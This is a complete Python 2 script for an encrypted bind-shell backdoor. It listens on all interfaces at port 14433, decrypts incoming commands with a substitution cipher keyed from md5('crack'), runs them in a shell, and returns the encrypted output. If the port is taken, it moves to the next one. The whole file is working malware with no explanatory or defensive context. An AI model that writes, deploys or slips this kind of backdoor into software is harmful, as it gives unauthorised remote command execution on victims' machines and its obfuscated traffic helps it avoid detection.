#!/usr/bin/env python
import sys
import socket
import select
import struct
import string
import SocketServer
import subprocess
from hashlib import md5
HOST = '0.0.0.0'
PORT = 14433


def get_table():
    m = md5()
    m.update('crack')
    s = m.digest()
    (a, b) = struct.unpack('<QQ', s)
    table = [c for c in string.maketrans('', '')]
    for i in xrange(1, 102):
            table.sort(lambda x, y: int(a % (ord(x) + i) - a % (ord(y) + i)))
    return table


encrypt_table = ''.join(get_table())
decrypt_table = string.maketrans(encrypt_table, string.maketrans('', ''))


def encrypt(data):
    return data.translate(encrypt_table)


def decrypt(data):
    return data.translate(decrypt_table)


class BackDoor(SocketServer.StreamRequestHandler):
    def handle_command(self, sock):
        try:
            while 1:
                r, w, e = select.select([sock], [], [])
                if not r:
                    break
                if sock in r:
                    command = decrypt(sock.recv(1024))
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    if stdout_value:
                        sock.send(encrypt(stdout_value))
                    else:
                        sock.send(encrypt('1'))
        except socket.error, e:
            pass
        finally:
            sock.close()

    def handle(self):
        self.handle_command(self.connection)


class Thread_TCP(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    allow_reuse_address = True


if __name__ == '__main__':
    try:
        server = Thread_TCP((HOST, PORT), BackDoor)
        print 'start listening at ---%d' % PORT
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
        sys.exit(0)
    except socket.error, e:
        # if socket.errno == errno.EADDRINUSE
        print e[0]
        if e[0] == 98:
            PORT += 1
            server = Thread_TCP((HOST, PORT), BackDoor)
            print 'start listening at ---%d' % PORT
            server.serve_forever()
        else:
            pass

